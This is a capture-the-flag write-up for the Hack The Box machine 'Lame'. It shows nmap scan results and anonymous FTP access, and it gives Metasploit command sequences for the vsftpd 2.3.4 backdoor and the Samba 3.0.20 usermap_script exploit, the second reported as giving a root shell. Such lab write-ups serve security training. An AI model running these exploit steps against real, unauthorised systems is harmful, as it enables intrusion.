# Hack the Box - Lame
&nbsp;
- Machine IP: 10.10.10.3
 
&nbsp;

----
&nbsp;
  
## Enumeration

### Nmap Results
``` 
#### Nmap 7.93 scan initiated Tue Dec 20 16:53:50 2022 as: nmap -sV -sC -A -Pn -oN 10.10.10.3.txt 10.10.10.3
> Nmap scan report for 10.10.10.3
> Host is up (0.060s latency).
> Not shown: 996 filtered tcp ports (no-response)
>
> PORT    STATE SERVICE     VERSION
> 21/tcp  open  ftp         vsftpd 2.3.4
> | ftp-syst: 
> |   STAT: 
> | FTP server status:
> |      Connected to 10.10.14.10
> |      Logged in as ftp
> |      TYPE: ASCII
> |      No session bandwidth limit
> |      Session timeout in seconds is 300
> |      Control connection is plain text
> |      Data connections will be plain text
> |      vsFTPd 2.3.4 - secure, fast, stable
> |_End of status
> |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
>
> 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
> | ssh-hostkey: 
> |   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
> |_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
>
> 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
>
> 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
>
> Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
>
>
>
> Host script results:
> | smb-security-mode: 
> |   account_used: guest
> |   authentication_level: user
> |   challenge_response: supported
> |_  message_signing: disabled (dangerous, but default)
> | smb-os-discovery: 
> |   OS: Unix (Samba 3.0.20-Debian)
> |   Computer name: lame
> |   NetBIOS computer name: 
> |   Domain name: hackthebox.gr
> |   FQDN: lame.hackthebox.gr
> |_  System time: 2022-12-20T17:54:20-05:00
> |_smb2-time: Protocol negotiation failed (SMB2)
> |_clock-skew: mean: 2h30m11s, deviation: 3h32m10s, median: 9s
>
> 
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>
#### Nmap done at Tue Dec 20 16:54:47 2022 -- 1 IP address (1 host up) scanned in 57.28 seconds
```

- No web server
- SSH is pretty secure
- Test FTP 21 and SMB 139/445

### FTP testing
```
> ftp 10.10.10.3
```
- Attempt sign in with anonymous and no password
  - Success
    - Seems to be root
    - No files of note found

- Check for vsftpd 2.3.4 vulnerabilities
  ```
  > searchsploit vsftpd 2.3.4    
  ```
  - `Backdoor Command Execution` available
    ```
    > msfconsole
    > search vsftpd 2.3.4
    > use exploit/unix/ftp/vsftpd_234_backdoor
    > set RHOST 10.10.10.3
    > exploit
    ```
    - We get banner 220, but are prompted for a password 
    - Using no password like specified before, exploit completes but no session is created

### SMB testing
- Check for vulerabilities on smbd 3.0.20
  ```
  > searchsploit 3.0.20
  ```
  - `Username map script Command Execution` available
    ```
    > msfconsole
    > search samba 3.0.20
    > use exploit/multi/samba/usermap_script
    > set RHOST 10.10.10.3
    > set LHOST tun0
    > exploit
    ```
    - ~~At this point I ran into an issue where no session would be created, no matter what I try. Multiple walkthroughs don't seem to have any trouble executing this script. I will return to this box later.~~
    - Get shell with root access
    ![](root%20shell.png)
    - Find user flag
    ![](user%20flag.png)
    - Find root flag
    ![](root%20shell.png)
  - `Remote Heap Overflow` available
